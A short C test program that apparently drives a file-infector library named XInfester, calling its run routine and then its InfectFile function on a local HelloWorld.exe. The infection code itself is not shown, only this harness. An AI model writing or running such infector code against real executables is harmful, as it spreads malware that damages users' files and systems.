#include "./inc/XInfester.h"

int main()
{
	XInfester_Run();
	if(!XInfester_InfectFile("E:\\debug\\HelloWorld.exe"))
		printf("infect failed\n");
	
	printf("Xinfester Hello World.\n");
	getchar();
}